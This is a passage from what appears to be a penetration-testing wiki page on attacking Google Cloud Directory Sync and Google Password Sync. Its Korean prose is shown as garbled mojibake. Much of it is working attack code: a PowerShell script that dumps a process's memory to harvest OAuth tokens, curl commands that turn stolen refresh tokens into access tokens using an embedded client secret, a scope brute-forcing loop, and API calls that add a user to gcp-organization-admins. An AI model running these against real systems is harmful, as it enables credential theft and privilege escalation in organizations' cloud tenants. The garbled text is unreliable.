Write-Host "Decrypted Refresh Token: $refreshToken"
Write-Host "Decrypted Password: $decryptedPassword"
```
</details>

{% hint style="info" %}
ì´ ì •ë³´ë¥¼ í™•ì¸í•˜ëŠ” ë°©ë²•ì€ **`C:\Program Files\Google Cloud Directory Sync`**ì˜ **`DirSync.jar`** ìë°” ì½”ë“œë¥¼ í™•ì¸í•˜ê³  `exportkeys` ë¬¸ìì—´ì„ ê²€ìƒ‰í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤ (ì´ëŠ” ë°”ì´ë„ˆë¦¬ `upgrade-config.exe`ê°€ í‚¤ë¥¼ ë¤í”„í•˜ê¸° ìœ„í•´ ê¸°ëŒ€í•˜ëŠ” CLI ë§¤ê°œë³€ìˆ˜ì…ë‹ˆë‹¤).
{% endhint %}

powershell ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‚¬ìš©í•˜ëŠ” ëŒ€ì‹ , ë§¤ê°œë³€ìˆ˜ `-exportKeys`ì™€ í•¨ê»˜ ë°”ì´ë„ˆë¦¬ **`:\Program Files\Google Cloud Directory Sync\upgrade-config.exe`**ë¥¼ ì‚¬ìš©í•˜ì—¬ ë ˆì§€ìŠ¤íŠ¸ë¦¬ì—ì„œ **Key**ì™€ **IV**ë¥¼ í—¥ì‚¬ë¡œ ê°€ì ¸ì˜¨ ë‹¤ìŒ, AES/CBCì™€ í•´ë‹¹ í‚¤ ë° IVë¥¼ ì‚¬ìš©í•˜ì—¬ ì •ë³´ë¥¼ ë³µí˜¸í™”í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### GCDS - ë©”ëª¨ë¦¬ì—ì„œ í† í° ë¤í”„í•˜ê¸°

GCPWì™€ ë§ˆì°¬ê°€ì§€ë¡œ, `config-manager.exe` í”„ë¡œì„¸ìŠ¤ì˜ ë©”ëª¨ë¦¬ë¥¼ ë¤í”„í•  ìˆ˜ ìˆìœ¼ë©° (ì´ê²ƒì€ GCDSì˜ GUIê°€ ìˆëŠ” ì£¼ìš” ë°”ì´ë„ˆë¦¬ì˜ ì´ë¦„ì…ë‹ˆë‹¤) ì´ë¯¸ ìƒì„±ëœ ê²½ìš° ìƒˆë¡œ ê³ ì¹¨ ë° ì•¡ì„¸ìŠ¤ í† í°ì„ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
ADì— êµ¬ì„±ëœ ìê²© ì¦ëª…ë„ ì°¾ì„ ìˆ˜ ìˆì„ ê²ƒì…ë‹ˆë‹¤.

<details>

<summary>config-manager.exe í”„ë¡œì„¸ìŠ¤ ë¤í”„ ë° í† í° ê²€ìƒ‰</summary>
```powershell
# Define paths for Procdump and Strings utilities
$procdumpPath = "C:\Users\carlos_hacktricks\Desktop\SysinternalsSuite\procdump.exe"
$stringsPath = "C:\Users\carlos_hacktricks\Desktop\SysinternalsSuite\strings.exe"
$dumpFolder = "C:\Users\Public\dumps"

# Regular expressions for tokens
$tokenRegexes = @(
"ya29\.[a-zA-Z0-9_\.\-]{50,}",
"1//[a-zA-Z0-9_\.\-]{50,}"
)

# Create a directory for the dumps if it doesn't exist
if (!(Test-Path $dumpFolder)) {
New-Item -Path $dumpFolder -ItemType Directory
}

# Get all Chrome process IDs
$chromeProcesses = Get-Process -Name "config-manager" -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Id

# Dump each Chrome process
foreach ($processId in $chromeProcesses) {
Write-Output "Dumping process with PID: $processId"
& $procdumpPath -accepteula -ma $processId "$dumpFolder\chrome_$processId.dmp"
}

# Extract strings and search for tokens in each dump
Get-ChildItem $dumpFolder -Filter "*.dmp" | ForEach-Object {
$dumpFile = $_.FullName
$baseName = $_.BaseName
$asciiStringsFile = "$dumpFolder\${baseName}_ascii_strings.txt"
$unicodeStringsFile = "$dumpFolder\${baseName}_unicode_strings.txt"

Write-Output "Extracting strings from $dumpFile"
& $stringsPath -accepteula -n 50 -nobanner $dumpFile > $asciiStringsFile
& $stringsPath -accepteula -n 50 -nobanner -u $dumpFile > $unicodeStringsFile

$outputFiles = @($asciiStringsFile, $unicodeStringsFile)

foreach ($file in $outputFiles) {
foreach ($regex in $tokenRegexes) {

$matches = Select-String -Path $file -Pattern $regex -AllMatches

$uniqueMatches = @{}

foreach ($matchInfo in $matches) {
foreach ($match in $matchInfo.Matches) {
$matchValue = $match.Value
if (-not $uniqueMatches.ContainsKey($matchValue)) {
$uniqueMatches[$matchValue] = @{
LineNumber = $matchInfo.LineNumber
LineText   = $matchInfo.Line.Trim()
FilePath   = $matchInfo.Path
}
}
}
}

foreach ($matchValue in $uniqueMatches.Keys) {
$info = $uniqueMatches[$matchValue]
Write-Output "Match found in file '$($info.FilePath)' on line $($info.LineNumber): $($info.LineText)"
}
}

Write-Output ""
}
}

Remove-Item -Path $dumpFolder -Recurse -Force
```
</details>

### GCDS - ë¦¬í”„ë ˆì‹œ í† í°ì—ì„œ ì•¡ì„¸ìŠ¤ í† í° ìƒì„±

ë¦¬í”„ë ˆì‹œ í† í°ì„ ì‚¬ìš©í•˜ì—¬ ë‹¤ìŒ ëª…ë ¹ì— ì§€ì •ëœ í´ë¼ì´ì–¸íŠ¸ IDì™€ í´ë¼ì´ì–¸íŠ¸ ë¹„ë°€ì„ ì‚¬ìš©í•˜ì—¬ ì•¡ì„¸ìŠ¤ í† í°ì„ ìƒì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
curl -s --data "client_id=118556098869.apps.googleusercontent.com" \
--data "client_secret=Co-LoSjkPcQXD9EjJzWQcgpy" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03gQU44mwVnU4CDHYE736TGMSNwF-L9IrTuikNFVZQ3sBxshrJaki7QvpHZQMeANHrF0eIPebz0dz0S987354AuSdX38LySlWflI" \
https://www.googleapis.com/oauth2/v4/token
```
### GCDS - Scopes

{% hint style="info" %}
ë¦¬í”„ë ˆì‹œ í† í°ì´ ìˆë”ë¼ë„, ì•¡ì„¸ìŠ¤ í† í°ì„ ìœ„í•´ ìš”ì²­í•  ìˆ˜ ìˆëŠ” ìŠ¤ì½”í”„ëŠ” **ì•¡ì„¸ìŠ¤ í† í°ì„ ìƒì„±í•˜ëŠ” ì• í”Œë¦¬ì¼€ì´ì…˜ì—ì„œ ì§€ì›í•˜ëŠ” ìŠ¤ì½”í”„**ë§Œ ìš”ì²­í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ë˜í•œ, ë¦¬í”„ë ˆì‹œ í† í°ì€ ëª¨ë“  ì• í”Œë¦¬ì¼€ì´ì…˜ì—ì„œ ìœ íš¨í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤.
{% endhint %}

ê¸°ë³¸ì ìœ¼ë¡œ GCSDëŠ” ì‚¬ìš©ìì˜ ëª¨ë“  ê°€ëŠ¥í•œ OAuth ìŠ¤ì½”í”„ì— ì ‘ê·¼í•  ìˆ˜ ì—†ìœ¼ë¯€ë¡œ, ë‹¤ìŒ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‚¬ìš©í•˜ì—¬ `refresh_token`ìœ¼ë¡œ `access_token`ì„ ìƒì„±í•˜ëŠ” ë° ì‚¬ìš©í•  ìˆ˜ ìˆëŠ” ìŠ¤ì½”í”„ë¥¼ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤:

<details>

<summary>Bash script to brute-force scopes</summary>
```bash
curl "https://developers.google.com/identity/protocols/oauth2/scopes" | grep -oE 'https://www.googleapis.com/auth/[a-zA-Z/\._\-]*' | sort -u | while read -r scope; do
echo -ne "Testing $scope           \r"
if ! curl -s --data "client_id=118556098869.apps.googleusercontent.com" \
--data "client_secret=Co-LoSjkPcQXD9EjJzWQcgpy" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03PR0VQOSCjS1CgYIARAAGAMSNwF-L9Ir5b_vOaCmnXzla0nL7dX7TJJwFcvrfgDPWI-j19Z4luLpYfLyv7miQyvgyXjGEXt-t0A" \
--data "scope=$scope" \
https://www.googleapis.com/oauth2/v4/token 2>&1 | grep -q "error_description"; then
echo ""
echo $scope
echo $scope >> /tmp/valid_scopes.txt
fi
done

echo ""
echo ""
echo "Valid scopes:"
cat /tmp/valid_scopes.txt
rm /tmp/valid_scopes.txt
```
</details>

ê·¸ë¦¬ê³  ì´ê²ƒì€ ì œê°€ ì‘ì„± ë‹¹ì‹œ ë°›ì€ ì¶œë ¥ì…ë‹ˆë‹¤:
```
https://www.googleapis.com/auth/admin.directory.group
https://www.googleapis.com/auth/admin.directory.orgunit
https://www.googleapis.com/auth/admin.directory.resource.calendar
https://www.googleapis.com/auth/admin.directory.user
https://www.googleapis.com/auth/admin.directory.userschema
https://www.googleapis.com/auth/apps.groups.settings
https://www.googleapis.com/auth/apps.licensing
https://www.googleapis.com/auth/contacts
```
#### ì‚¬ìš©ì ìƒì„± ë° `gcp-organization-admins` ê·¸ë£¹ì— ì¶”ê°€í•˜ì—¬ GCPì—ì„œ ê¶Œí•œ ìƒìŠ¹ ì‹œë„
```bash
# Create new user
curl -X POST \
'https://admin.googleapis.com/admin/directory/v1/users' \
-H 'Authorization: Bearer <ACCESS_TOKEN>' \
-H 'Content-Type: application/json' \
-d '{
"primaryEmail": "deleteme@domain.com",
"name": {
"givenName": "Delete",
"familyName": "Me"
},
"password": "P4ssw0rdStr0ng!",
"changePasswordAtNextLogin": false
}'

# Add to group
curl -X POST \
'https://admin.googleapis.com/admin/directory/v1/groups/gcp-organization-admins@domain.com/members' \
-H 'Authorization: Bearer <ACCESS_TOKEN>' \
-H 'Content-Type: application/json' \
-d '{
"email": "deleteme@domain.com",
"role": "OWNER"
}'

# You could also change the password of a user for example
```
{% hint style="danger" %}
ìƒˆ ì‚¬ìš©ìì—ê²Œ Super Admin ì—­í• ì„ ë¶€ì—¬í•  ìˆ˜ ì—†ìŠµë‹ˆë‹¤. **ë¦¬í”„ë ˆì‹œ í† í°ì— í•„ìš”í•œ ë²”ìœ„ê°€ ì¶©ë¶„í•˜ì§€ ì•Šê¸° ë•Œë¬¸ì…ë‹ˆë‹¤.**
{% endhint %}

## ê´€ë¦¬ ë””ë ‰í† ë¦¬ ë™ê¸°í™”

GCDSì™€ ì‚¬ìš©ìë¥¼ ë™ê¸°í™”í•˜ëŠ” ì´ ë°©ë²•ì˜ ì£¼ìš” ì°¨ì´ì ì€ GCDSê°€ ë‹¤ìš´ë¡œë“œí•˜ì—¬ ì‹¤í–‰í•´ì•¼ í•˜ëŠ” ì¼ë¶€ ë°”ì´ë„ˆë¦¬ë¡œ ìˆ˜ë™ìœ¼ë¡œ ìˆ˜í–‰ë˜ëŠ” ë°˜ë©´, **ê´€ë¦¬ ë””ë ‰í† ë¦¬ ë™ê¸°í™”ëŠ” ì„œë²„ë¦¬ìŠ¤**ë¡œ Googleì´ ê´€ë¦¬í•©ë‹ˆë‹¤ [https://admin.google.com/ac/sync/externaldirectories](https://admin.google.com/ac/sync/externaldirectories).

ì´ ê¸€ì„ ì‘ì„±í•˜ëŠ” ì‹œì ì—ì„œ ì´ ì„œë¹„ìŠ¤ëŠ” ë² íƒ€ ìƒíƒœì´ë©° ë‘ ê°€ì§€ ìœ í˜•ì˜ ë™ê¸°í™”ë¥¼ ì§€ì›í•©ë‹ˆë‹¤: **Active Directory**ì™€ **Azure Entra ID**ì—ì„œ:

* **Active Directory:** ì´ë¥¼ ì„¤ì •í•˜ë ¤ë©´ **Googleì— Active Directory í™˜ê²½ì— ëŒ€í•œ ì•¡ì„¸ìŠ¤ë¥¼ ì œê³µí•´ì•¼ í•©ë‹ˆë‹¤**. Googleì€ GCP ë„¤íŠ¸ì›Œí¬( **VPC ì»¤ë„¥í„°**ë¥¼ í†µí•´)ë§Œ ì•¡ì„¸ìŠ¤í•  ìˆ˜ ìˆìœ¼ë¯€ë¡œ ì»¤ë„¥í„°ë¥¼ ìƒì„±í•œ ë‹¤ìŒ GCP ë„¤íŠ¸ì›Œí¬ì˜ VMì— ìˆê±°ë‚˜ Cloud VPN ë˜ëŠ” Cloud Interconnectë¥¼ ì‚¬ìš©í•˜ì—¬ í•´ë‹¹ ì»¤ë„¥í„°ì—ì„œ ADë¥¼ ì‚¬ìš©í•  ìˆ˜ ìˆë„ë¡ í•´ì•¼ í•©ë‹ˆë‹¤. ê·¸ëŸ° ë‹¤ìŒ **ë””ë ‰í† ë¦¬ì— ëŒ€í•œ ì½ê¸° ì•¡ì„¸ìŠ¤ ê¶Œí•œì´ ìˆëŠ” ê³„ì •ì˜ ìê²© ì¦ëª…**ê³¼ **LDAPS**ë¥¼ í†µí•´ ì—°ë½í•˜ê¸° ìœ„í•œ **ì¸ì¦ì„œ**ë¥¼ ì œê³µí•´ì•¼ í•©ë‹ˆë‹¤.
* **Azure Entra ID:** ì´ë¥¼ êµ¬ì„±í•˜ë ¤ë©´ **Googleì´ í‘œì‹œí•˜ëŠ” íŒì—…ì—ì„œ Entra ID êµ¬ë…ì— ëŒ€í•œ ì½ê¸° ì•¡ì„¸ìŠ¤ ê¶Œí•œì´ ìˆëŠ” ì‚¬ìš©ìë¡œ Azureì— ë¡œê·¸ì¸**í•˜ê¸°ë§Œ í•˜ë©´ ë˜ë©°, Googleì€ Entra IDì— ëŒ€í•œ ì½ê¸° ì•¡ì„¸ìŠ¤ ê¶Œí•œì´ ìˆëŠ” í† í°ì„ ìœ ì§€í•©ë‹ˆë‹¤.

ì˜¬ë°”ë¥´ê²Œ êµ¬ì„±ë˜ë©´ ë‘ ì˜µì…˜ ëª¨ë‘ **Workspaceì— ì‚¬ìš©ì ë° ê·¸ë£¹ì„ ë™ê¸°í™”í•  ìˆ˜ ìˆì§€ë§Œ**, Workspaceì—ì„œ AD ë˜ëŠ” EntraIDë¡œ ì‚¬ìš©ì ë° ê·¸ë£¹ì„ êµ¬ì„±í•  ìˆ˜ëŠ” ì—†ìŠµë‹ˆë‹¤.

ì´ ë™ê¸°í™” ì¤‘ì— í—ˆìš©ë˜ëŠ” ë‹¤ë¥¸ ì˜µì…˜ì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤:

* ìƒˆ ì‚¬ìš©ìì—ê²Œ ë¡œê·¸ì¸í•˜ë¼ëŠ” ì´ë©”ì¼ ì „ì†¡
* Workspaceì—ì„œ ì‚¬ìš©í•˜ëŠ” ì´ë©”ì¼ ì£¼ì†Œë¡œ ìë™ìœ¼ë¡œ ë³€ê²½. ë”°ë¼ì„œ Workspaceê°€ `@hacktricks.xyz`ë¥¼ ì‚¬ìš©í•˜ê³  EntraID ì‚¬ìš©ìê°€ `@carloshacktricks.onmicrosoft.com`ì„ ì‚¬ìš©í•˜ëŠ” ê²½ìš°, `@hacktricks.xyz`ê°€ ê³„ì •ì— ìƒì„±ëœ ì‚¬ìš©ìì—ê²Œ ì‚¬ìš©ë©ë‹ˆë‹¤.
* ë™ê¸°í™”í•  **ì‚¬ìš©ìê°€ í¬í•¨ëœ ê·¸ë£¹ ì„ íƒ**.
* Workspaceì—ì„œ ë™ê¸°í™”í•˜ê³  ìƒì„±í•  **ê·¸ë£¹ ì„ íƒ**(ë˜ëŠ” ëª¨ë“  ê·¸ë£¹ì„ ë™ê¸°í™”í•˜ë„ë¡ ì§€ì •).

### AD/EntraID -> Google Workspace

AD ë˜ëŠ” EntraIDë¥¼ ì†ìƒì‹œí‚¤ë©´ Google Workspaceì™€ ë™ê¸°í™”ë  ì‚¬ìš©ì ë° ê·¸ë£¹ì„ ì™„ì „íˆ ì œì–´í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
ê·¸ëŸ¬ë‚˜ ì‚¬ìš©ìê°€ Workspaceì—ì„œ ì‚¬ìš©í•  ìˆ˜ ìˆëŠ” **ë¹„ë°€ë²ˆí˜¸**ëŠ” **ê°™ì„ ìˆ˜ë„ ìˆê³  ì•„ë‹ ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤**.

#### ì‚¬ìš©ì ê³µê²©

ë™ê¸°í™”ê°€ ë°œìƒí•˜ë©´ **ADì˜ ëª¨ë“  ì‚¬ìš©ì ë˜ëŠ” íŠ¹ì • OUì˜ ì‚¬ìš©ìë§Œ ë™ê¸°í™”ë˜ê±°ë‚˜ EntraIDì˜ íŠ¹ì • ê·¸ë£¹ì˜ ì‚¬ìš©ìë§Œ ë™ê¸°í™”ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤**. ì´ëŠ” ë™ê¸°í™”ëœ ì‚¬ìš©ì(ë˜ëŠ” ë™ê¸°í™”ë˜ëŠ” ìƒˆ ì‚¬ìš©ì)ë¥¼ ê³µê²©í•˜ë ¤ë©´ ë¨¼ì € ì–´ë–¤ ì‚¬ìš©ìê°€ ë™ê¸°í™”ë˜ê³  ìˆëŠ”ì§€ íŒŒì•…í•´ì•¼ í•¨ì„ ì˜ë¯¸í•©ë‹ˆë‹¤.

* ì‚¬ìš©ìëŠ” **AD ë˜ëŠ” EntraIDì—ì„œ ë¹„ë°€ë²ˆí˜¸ë¥¼ ì¬ì‚¬ìš©í•  ìˆ˜ë„ ìˆê³  ì•„ë‹ ìˆ˜ë„ ìˆì§€ë§Œ**, ì´ëŠ” **ë¡œê·¸ì¸í•˜ê¸° ìœ„í•´ ì‚¬ìš©ìì˜ ë¹„ë°€ë²ˆí˜¸ë¥¼ ì†ìƒì‹œì¼œì•¼ í•¨ì„ ì˜ë¯¸í•©ë‹ˆë‹¤**.
* ì‚¬ìš©ìì˜ **ì´ë©”ì¼**ì— ì•¡ì„¸ìŠ¤í•  ìˆ˜ ìˆëŠ” ê²½ìš°, **ê¸°ì¡´ ì‚¬ìš©ìì˜ Workspace ë¹„ë°€ë²ˆí˜¸ë¥¼ ë³€ê²½**í•˜ê±°ë‚˜ **ìƒˆ ì‚¬ìš©ìë¥¼ ìƒì„±**í•˜ê³ , ë™ê¸°í™”ë  ë•Œê¹Œì§€ ê¸°ë‹¤ë ¸ë‹¤ê°€ ê³„ì •ì„ ì„¤ì •í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

Workspace ë‚´ì—ì„œ ì‚¬ìš©ìì— ì•¡ì„¸ìŠ¤í•˜ë©´ ê¸°ë³¸ì ìœ¼ë¡œ ì¼ë¶€ **ê¶Œí•œì´ ë¶€ì—¬ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤**.

#### ê·¸ë£¹ ê³µê²©

ì–´ë–¤ ê·¸ë£¹ì´ ë™ê¸°í™”ë˜ê³  ìˆëŠ”ì§€ ë¨¼ì € íŒŒì•…í•´ì•¼ í•©ë‹ˆë‹¤. **ëª¨ë“ ** ê·¸ë£¹ì´ ë™ê¸°í™”ë˜ê³  ìˆì„ ê°€ëŠ¥ì„±ë„ ìˆìŠµë‹ˆë‹¤(Workspaceê°€ ì´ë¥¼ í—ˆìš©í•˜ë¯€ë¡œ).

{% hint style="info" %}
ê·¸ë£¹ ë° êµ¬ì„±ì›ì´ Workspaceë¡œ ê°€ì ¸ì™€ì§€ë”ë¼ë„, **ì‚¬ìš©ì ë™ê¸°í™”ì—ì„œ ë™ê¸°í™”ë˜ì§€ ì•Šì€ ì‚¬ìš©ìëŠ” ê·¸ë£¹ ë™ê¸°í™” ì¤‘ì— ìƒì„±ë˜ì§€ ì•ŠìŠµë‹ˆë‹¤**. ë¹„ë¡ ê·¸ë“¤ì´ ë™ê¸°í™”ëœ ê·¸ë£¹ì˜ êµ¬ì„±ì›ì¼ì§€ë¼ë„ ë§ì…ë‹ˆë‹¤.
{% endhint %}

Azureì—ì„œ **Workspace ë˜ëŠ” GCPì— ê¶Œí•œì´ ë¶€ì—¬ëœ ê·¸ë£¹**ì„ ì•Œê³  ìˆë‹¤ë©´, ì†ìƒëœ ì‚¬ìš©ì(ë˜ëŠ” ìƒˆë¡œ ìƒì„±ëœ ì‚¬ìš©ì)ë¥¼ í•´ë‹¹ ê·¸ë£¹ì— ì¶”ê°€í•˜ê³  ê·¸ ê¶Œí•œì„ ì–»ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

Workspaceì—ì„œ ê¸°ì¡´ì˜ íŠ¹ê¶Œ ê·¸ë£¹ì„ ì•…ìš©í•  ìˆ˜ ìˆëŠ” ë˜ ë‹¤ë¥¸ ì˜µì…˜ì´ ìˆìŠµë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´, ê·¸ë£¹ `gcp-organization-admins@<workspace.email>`ì€ ì¼ë°˜ì ìœ¼ë¡œ GCPì— ëŒ€í•œ ë†’ì€ ê¶Œí•œì„ ê°€ì§€ê³  ìˆìŠµë‹ˆë‹¤.

ì˜ˆë¥¼ ë“¤ì–´ EntraIDì—ì„œ Workspaceë¡œì˜ ë™ê¸°í™”ê°€ **ê°€ì ¸ì˜¨ ê°ì²´ì˜ ë„ë©”ì¸ì„ Workspaceì˜ ì´ë©”ì¼ë¡œ êµì²´í•˜ë„ë¡ êµ¬ì„±ëœ ê²½ìš°**, ê³µê²©ìê°€ EntraIDì—ì„œ `gcp-organization-admins@<entraid.email>` ê·¸ë£¹ì„ ìƒì„±í•˜ê³  ì´ ê·¸ë£¹ì— ì‚¬ìš©ìë¥¼ ì¶”ê°€í•œ ë‹¤ìŒ ëª¨ë“  ê·¸ë£¹ì˜ ë™ê¸°í™”ê°€ ë°œìƒí•  ë•Œê¹Œì§€ ê¸°ë‹¤ë¦´ ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
**ì‚¬ìš©ìëŠ” `gcp-organization-admins@<workspace.email>` ê·¸ë£¹ì— ì¶”ê°€ë˜ì–´ GCPì—ì„œ ê¶Œí•œì´ ìƒìŠ¹í•©ë‹ˆë‹¤.**

### Google Workspace -> AD/EntraID

WorkspaceëŠ” ì‚¬ìš©ì ë° ê·¸ë£¹ì„ ë™ê¸°í™”í•˜ê¸° ìœ„í•´ AD ë˜ëŠ” EntraIDì— ëŒ€í•œ ì½ê¸° ì „ìš© ì•¡ì„¸ìŠ¤ ê¶Œí•œì´ ìˆëŠ” ìê²© ì¦ëª…ì„ ìš”êµ¬í•©ë‹ˆë‹¤. ë”°ë¼ì„œ Google Workspaceë¥¼ ì•…ìš©í•˜ì—¬ AD ë˜ëŠ” EntraIDì—ì„œ ë³€ê²½ì„ ìˆ˜í–‰í•˜ëŠ” ê²ƒì€ ë¶ˆê°€ëŠ¥í•©ë‹ˆë‹¤. ë”°ë¼ì„œ **í˜„ì¬ë¡œì„œëŠ” ë¶ˆê°€ëŠ¥í•©ë‹ˆë‹¤**.

Googleì´ AD ìê²© ì¦ëª…ì´ë‚˜ EntraID í† í°ì„ ì–´ë””ì— ì €ì¥í•˜ëŠ”ì§€ ëª¨ë¥´ë©°, **ë™ê¸°í™”ë¥¼ ì¬êµ¬ì„±í•˜ì—¬ ë³µêµ¬í•  ìˆ˜ ì—†ìŠµë‹ˆë‹¤**(ì›¹ ì–‘ì‹ì— ë‚˜íƒ€ë‚˜ì§€ ì•Šìœ¼ë©°, ë‹¤ì‹œ ì œê³µí•´ì•¼ í•©ë‹ˆë‹¤). ê·¸ëŸ¬ë‚˜ ì›¹ì—ì„œ í˜„ì¬ ê¸°ëŠ¥ì„ ì•…ìš©í•˜ì—¬ **ì‚¬ìš©ì ë° ê·¸ë£¹ ëª©ë¡ì„ ë‚˜ì—´í•  ìˆ˜ ìˆì„ì§€ë„ ëª¨ë¦…ë‹ˆë‹¤**.

## GPS - Google ë¹„ë°€ë²ˆí˜¸ ë™ê¸°í™”

ì´ê²ƒì€ Googleì´ **ADì™€ Workspace ê°„ì˜ ì‚¬ìš©ì ë¹„ë°€ë²ˆí˜¸ë¥¼ ë™ê¸°í™”í•˜ê¸° ìœ„í•´ ì œê³µí•˜ëŠ” ë°”ì´ë„ˆë¦¬ ë° ì„œë¹„ìŠ¤**ì…ë‹ˆë‹¤. ì‚¬ìš©ìê°€ ADì—ì„œ ë¹„ë°€ë²ˆí˜¸ë¥¼ ë³€ê²½í•  ë•Œë§ˆë‹¤ Googleì— ì„¤ì •ë©ë‹ˆë‹¤.

`C:\Program Files\Google\Password Sync`ì— ì„¤ì¹˜ë˜ë©°, ì—¬ê¸°ì—ì„œ êµ¬ì„±í•  ìˆ˜ ìˆëŠ” ë°”ì´ë„ˆë¦¬ `PasswordSync.exe`ì™€ ê³„ì† ì‹¤í–‰ë  ì„œë¹„ìŠ¤ì¸ `password_sync_service.exe`ë¥¼ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### GPS - êµ¬ì„±

ì´ ë°”ì´ë„ˆë¦¬(ë° ì„œë¹„ìŠ¤)ë¥¼ êµ¬ì„±í•˜ë ¤ë©´ **Workspaceì—ì„œ Super Admin ì£¼ì²´ì— ëŒ€í•œ ì•¡ì„¸ìŠ¤ë¥¼ ì œê³µí•´ì•¼ í•©ë‹ˆë‹¤**:

* Googleì„ í†µí•´ **OAuth**ë¡œ ë¡œê·¸ì¸í•œ í›„ **ë ˆì§€ìŠ¤íŠ¸ë¦¬ì— í† í°ì„ ì €ì¥í•©ë‹ˆë‹¤(ì•”í˜¸í™”ë¨)**
* GUIê°€ ìˆëŠ” ë„ë©”ì¸ ì»¨íŠ¸ë¡¤ëŸ¬ì—ì„œë§Œ ì‚¬ìš© ê°€ëŠ¥
* **Workspace ì‚¬ìš©ì ê´€ë¦¬** ê¶Œí•œì´ ìˆëŠ” **GCPì˜ ì„œë¹„ìŠ¤ ê³„ì • ìê²© ì¦ëª…**(json íŒŒì¼) ì œê³µ
* ì´ëŸ¬í•œ ìê²© ì¦ëª…ì€ ë§Œë£Œë˜ì§€ ì•Šìœ¼ë©° ì•…ìš©ë  ìˆ˜ ìˆìœ¼ë¯€ë¡œ ë§¤ìš° ë‚˜ìœ ì•„ì´ë””ì–´
* ì„œë¹„ìŠ¤ ê³„ì •ì´ Workspaceì— ëŒ€í•œ ì•¡ì„¸ìŠ¤ë¥¼ ê°–ëŠ” ê²ƒì€ ë§¤ìš° ë‚˜ìœ ì•„ì´ë””ì–´ì…ë‹ˆë‹¤. ì„œë¹„ìŠ¤ ê³„ì •ì´ GCPì—ì„œ ì†ìƒë˜ë©´ Workspaceë¡œ í”¼ë²—í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* Googleì€ GUIê°€ ì—†ëŠ” ë„ë©”ì¸ ì œì–´ë¥¼ ìœ„í•´ ì´ë¥¼ ìš”êµ¬í•©ë‹ˆë‹¤.
* ì´ëŸ¬í•œ ìê²© ì¦ëª…ë„ ë ˆì§€ìŠ¤íŠ¸ë¦¬ì— ì €ì¥ë©ë‹ˆë‹¤.

ADì™€ ê´€ë ¨í•˜ì—¬ í˜„ì¬ **ì‘ìš© í”„ë¡œê·¸ë¨ ì»¨í…ìŠ¤íŠ¸, ìµëª… ë˜ëŠ” íŠ¹ì • ìê²© ì¦ëª…**ì„ ì‚¬ìš©í•  ìˆ˜ ìˆë„ë¡ ì§€ì •í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ìê²© ì¦ëª… ì˜µì…˜ì´ ì„ íƒë˜ë©´ **ì‚¬ìš©ì ì´ë¦„**ì€ **ë””ìŠ¤í¬**ì˜ íŒŒì¼ì— ì €ì¥ë˜ê³  **ë¹„ë°€ë²ˆí˜¸**ëŠ” **ì•”í˜¸í™”ë˜ì–´** **ë ˆì§€ìŠ¤íŠ¸ë¦¬**ì— ì €ì¥ë©ë‹ˆë‹¤.

### GPS - ë””ìŠ¤í¬ì—ì„œ ë¹„ë°€ë²ˆí˜¸ ë° í† í° ë¤í”„

{% hint style="success" %}
[**Winpeas**](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS/winPEASexe)ê°€ **GPS**ë¥¼ ê°ì§€í•˜ê³  êµ¬ì„±ì— ëŒ€í•œ ì •ë³´ë¥¼ ì–»ìœ¼ë©° **ë¹„ë°€ë²ˆí˜¸ì™€ í† í°ì„ ë³µí˜¸í™”**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
{% endhint %}

**`C:\ProgramData\Google\Google Apps Password Sync\config.xml`** íŒŒì¼ì—ì„œ êµ¬ì„±ì˜ ì¼ë¶€ë¥¼ ì°¾ì„ ìˆ˜ ìˆìœ¼ë©°, ì—¬ê¸°ì—ëŠ” êµ¬ì„±ëœ ADì˜ **`baseDN`**ê³¼ ì‚¬ìš© ì¤‘ì¸ **`username`**ì´ í¬í•¨ë©ë‹ˆë‹¤.

ë ˆì§€ìŠ¤íŠ¸ë¦¬ **`HKLM\Software\Google\Google Apps Password Sync`**ì—ì„œ **ì•”í˜¸í™”ëœ ë¦¬í”„ë ˆì‹œ í† í°**ê³¼ **AD ì‚¬ìš©ìì— ëŒ€í•œ ì•”í˜¸**(ìˆëŠ” ê²½ìš°)ë¥¼ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë˜í•œ, í† í° ëŒ€ì‹  **SA ìê²© ì¦ëª…**ì´ ì‚¬ìš©ëœ ê²½ìš°, í•´ë‹¹ ë ˆì§€ìŠ¤íŠ¸ë¦¬ ì£¼ì†Œì—ì„œ ì•”í˜¸í™”ëœ ìê²© ì¦ëª…ì„ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ë ˆì§€ìŠ¤íŠ¸ë¦¬ ë‚´ì˜ **ê°’**ì€ **ê´€ë¦¬ì**ë§Œ **ì•¡ì„¸ìŠ¤í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤**.

